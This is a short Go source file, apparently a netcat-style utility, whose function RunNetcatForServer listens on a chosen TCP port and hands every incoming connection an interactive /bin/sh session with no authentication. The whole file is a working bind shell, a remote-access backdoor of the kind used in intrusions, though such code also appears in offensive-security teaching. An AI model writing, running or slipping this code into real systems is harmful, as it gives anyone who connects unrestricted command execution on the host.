package netcat

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handleConn(con net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")

	pr, pw := io.Pipe()

	cmd.Stdin = con
	cmd.Stdout = pw

	go func() {
		_, err := io.Copy(con, pr)

		if err != nil {
			log.Fatal(err)
		}
	}()

	cmd.Run()
	con.Close()

}

func RunNetcatForServer(port int) {

	listener, err := net.Listen("tcp", fmt.Sprintf(":%v", port))
	if err != nil {
		log.Fatalln(err)
	}

	log.Println("Server runned on port: " + fmt.Sprint(port))

	for {
		con, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}

		go handleConn(con)

	}

}
